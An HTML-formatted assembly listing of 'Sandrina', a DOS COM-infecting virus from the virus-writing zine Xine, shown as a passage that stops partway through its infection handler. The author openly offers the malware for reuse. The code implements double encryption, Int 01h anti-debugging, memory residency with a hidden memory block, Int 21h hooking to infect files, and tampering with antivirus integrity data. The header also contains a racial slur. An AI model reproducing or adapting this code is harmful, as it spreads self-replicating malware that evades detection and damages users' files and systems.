<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>san.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #3 - Phile 210 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Sandrina : She was really too sexy for me</span><span class="sc0">
</span><span class="sc1">; -ÄÄÄÄÄÄÄÄ- </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Author :      .UnknwoN MnemoniK</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Origin :  .Belgium</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Host :        .com non overwritter</span><span class="sc0">
</span><span class="sc1">;               .enun com included</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Per Process : .become TSR ( by dos 4A/48/49 )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hook/res :    .int 21h function 4Eh/54h</span><span class="sc0">
</span><span class="sc1">;       .int 24h handler! just for niggas who want spread it!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Note :    .This virus is just an exemple virus to use san anti-vir.dat</span><span class="sc0">
</span><span class="sc1">;       hacka engine , you can use it , modify it , pick it all times </span><span class="sc0">
</span><span class="sc1">;       you want. I don't add poly or stealth things because I don't </span><span class="sc0">
</span><span class="sc1">;       find it interresting in this case , a quite simple com </span><span class="sc0">
</span><span class="sc1">;       non-overwritter</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Specificty:   .Double encrypted + Anti debugging : Int 01h as the decryptor</span><span class="sc0">
</span><span class="sc1">;               yes , Two days ago , I was looking 29A and I saw </span><span class="sc0">
</span><span class="sc1">;               the desassembling of a virus who use this technique</span><span class="sc0">
</span><span class="sc1">;               I decide to test it myself and when an Int 01h are </span><span class="sc0">
</span><span class="sc1">;               executed being traced, no decryption is produced and the code </span><span class="sc0">
</span><span class="sc1">;       crash. His two encryption loop give him a gewd anti-heuristic </span><span class="sc0">
</span><span class="sc1">;       protection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               .Force Anti-vir.dat : I looked the bozo tutorial</span><span class="sc0">
</span><span class="sc1">;               and I decide also to code all this routine in one program</span><span class="sc0">
</span><span class="sc1">;               who originally just decrypt this anti-vir.dat , but now</span><span class="sc0">
</span><span class="sc1">;               it's modify all the file and rplace the value of the</span><span class="sc0">
</span><span class="sc1">;               infected as that place . He is quite gewd coding , you can </span><span class="sc0">
</span><span class="sc1">;       use it for yar virii if u want </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       .Intelligent Interrupt 24 handler , you ever used disk8 ?</span><span class="sc0">
</span><span class="sc1">;       Ok , so lets make a conversation about it , when u put an</span><span class="sc0">
</span><span class="sc1">;       Int24 handler and when the disk is writeprot , there's a dirty</span><span class="sc0">
</span><span class="sc1">;       sound isn't ? Yeah , you see , but now think if ya have like</span><span class="sc0">
</span><span class="sc1">;       each 4E/EF this sound 4 ou 5 times in one dir , this is </span><span class="sc0">
</span><span class="sc1">;       suspect , so now , the virus determine if it's a drive or a </span><span class="sc0">
</span><span class="sc1">;       disk , if it's a floppy , is the disk8 changed from the floppy</span><span class="sc0">
</span><span class="sc1">;       disk since last read ? if yes then put off the Write protected</span><span class="sc0">
</span><span class="sc1">;       internal flag , else then if the write proteced flag activate ,</span><span class="sc0">
</span><span class="sc1">;       skip the infection procedur , now there's a quite gewd </span><span class="sc0">
</span><span class="sc1">;       optimization , I have tested it , no problem , it's work fine!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Warning: a bug was reported , decryptor seems to detected by</span><span class="sc0">
</span><span class="sc1">;       TBAV and the C flag appears , but it comes only with the 2nd </span><span class="sc0">
</span><span class="sc1">;       3rd infection in the same directory , if you found it , don't</span><span class="sc0">
</span><span class="sc1">;       forget : starzero@hotmail.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">start0</span><span class="sc0">              </span><span class="sc1">; this jump will be reconstruct</span><span class="sc0">
                    </span><span class="sc1">; at next generation</span><span class="sc0">
</span><span class="sc5">start0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">              </span><span class="sc1">; Now we call virus for tha delta off.  </span><span class="sc0">

</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                          </span><span class="sc1">; delta offset ( if you don't </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">             </span><span class="sc1">; understand that , press ctrl-alt-del</span><span class="sc0">
                    </span><span class="sc1">; 3 time</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Part One</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  i11</span><span class="sc0">
</span><span class="sc1">;   11   Decryption zone</span><span class="sc0">
</span><span class="sc1">;  1111</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">                            </span><span class="sc1">; Get Int 01 adress</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; ask dos , dos do it !</span><span class="sc0">
                    </span><span class="sc1">; address will be back in es and bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                 </span><span class="sc1">; save es:bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">; now we have in ax = 2501h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; save it on stack</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">encrypt_loop0</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;put in dx offset decrypt loop + delta</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; move the int 01 handler here !</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">encrypt_begin</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; si = start decryption offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">encrypt_end</span><span class="sc4">-</span><span class="sc5">encrypt_begin</span><span class="sc0">

</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                                 </span><span class="sc1">; now decrypt it , when it's traced  </span><span class="sc0">
                    </span><span class="sc1">; the prog crash !</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">encrypt_begin</span><span class="sc0">           </span><span class="sc1">; jump </span><span class="sc0">

</span><span class="sc5">encrypt_loop0</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; but in reality , there is it</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">                      </span><span class="sc1">; alias xor byte ptr [di],xx</span><span class="sc0">
</span><span class="sc5">key1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">               
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; increment si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt_Loop0</span><span class="sc0">      </span><span class="sc1">; make the boucle untill cx=0</span><span class="sc0">

</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">encrypt_begin</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; secondary encryption</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; ax = 2501h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; dx = int 01 old offset</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; ds = int 01 old seg</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; restore old int 1 seg:off</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">encrypt_begin1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; second encrypt loop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">encrypt_end</span><span class="sc4">-</span><span class="sc5">encrypt_begin1</span><span class="sc0">

</span><span class="sc5">encrypt_loop2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc0">                             </span><span class="sc1">; anti debugging trick</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">                              </span><span class="sc1">; I remove stack trick </span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                               </span><span class="sc1">; because it allways crash</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                              </span><span class="sc1">; alias add byte ptr [si],xx</span><span class="sc0">
</span><span class="sc5">key2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                  

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt_loop2</span><span class="sc0">              </span><span class="sc1">; do the loop</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Part 2 : Put the virus in memory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ýýý22</span><span class="sc0">
</span><span class="sc1">; x22',  2ø) Put in memory the virus</span><span class="sc0">
</span><span class="sc1">; 22222</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">encrypt_begin1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                             </span><span class="sc1">; push 100h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                                 </span><span class="sc1">; return at 100h next boot</span><span class="sc0">
</span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">save</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; retore original bytes</span><span class="sc0">
</span><span class="sc6">movsb</span><span class="sc0">
                                                          
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5469h</span><span class="sc0">                            </span><span class="sc1">; sexy sandrina ;)</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0666h</span><span class="sc0">                            </span><span class="sc1">; test if we are already in memory</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                            </span><span class="sc1">; save 21h adress</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Old21S</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">      </span><span class="sc1">; save here the Int 21 seg</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Old21O</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; "    "    "   "   "  off</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">; es = cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                              </span><span class="sc1">; modify memory size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">               </span><span class="sc1">; get max memory</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; it must return with error and </span><span class="sc0">
                    </span><span class="sc1">; how memory is free</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">real_end</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc4">)+</span><span class="sc2">100h</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; reduce it</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; modify mem size</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">                               </span><span class="sc1">; if error ? Don't put the virus</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                              </span><span class="sc1">; allocate memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">real_end</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc4">)+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; all we need !</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; dec ax ( new seg )</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; to mark and hide this seg to dos</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">                 </span><span class="sc1">; mask it for dos</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; es = new seg</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                              </span><span class="sc1">; put the psp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">; ds &lt;- cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">real_end</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                              </span><span class="sc1">; put the code</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; ds &lt;- es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewInt_21</span><span class="sc0">         </span><span class="sc1">; DS:DX = Int_21_Handler</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; Set the new handler</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; ds &lt;- cs</span><span class="sc0">


</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; cs = es = ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">          </span><span class="sc1">; restore the dta</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; ask dos , dos do it !</span><span class="sc0">

</span><span class="sc1">; we return here to the host here , look , only a stupid ret!</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; remember , push di ( di = 100h )</span><span class="sc0">

</span><span class="sc1">;************************************************************************** </span><span class="sc0">
</span><span class="sc1">; Part Three</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 33333</span><span class="sc0">
</span><span class="sc1">;  -333  3ø) The Interrupt controller</span><span class="sc0">
</span><span class="sc1">; 33333</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">fake_24</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">iswriteprot</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Old24O</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Old24S</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NewInt_21</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; save the flag </span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">      </span><span class="sc1">; intercept FindFirst</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Handler21</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5469h</span><span class="sc0">    </span><span class="sc1">; Verify flag infos ( everybody don't</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_return</span><span class="sc0"> </span><span class="sc1">; care about it )</span><span class="sc0">

                        </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; restore it</span><span class="sc0">

</span><span class="sc5">JmpTO</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">         </span><span class="sc1">; jump to the real Int 21h</span><span class="sc0">
</span><span class="sc5">Old21O</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Old21S</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Do_Int21</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; here we make an Int 21h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">JmpTO</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">check_return</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0666h</span><span class="sc0">    </span><span class="sc1">; return with our verification code</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Handler21</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pusha</span><span class="sc0">                                   </span><span class="sc1">; save register + seg</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                              </span><span class="sc1">; save the current dta</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                 </span><span class="sc1">; and set ES = DS = CS</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                              </span><span class="sc1">; fix our dta</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_conditions</span><span class="sc0">                   </span><span class="sc1">; if we have enough memory for </span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">fin0</span><span class="sc0">                                 </span><span class="sc1">; modifing anti-vir.dat ?</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary_seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; if yes , save the temporary seg</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                </span><span class="sc1">; now we hide error handle for user</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; get adress  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old24S</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">     </span><span class="sc1">; and stock it here!</span><span class="sc0">
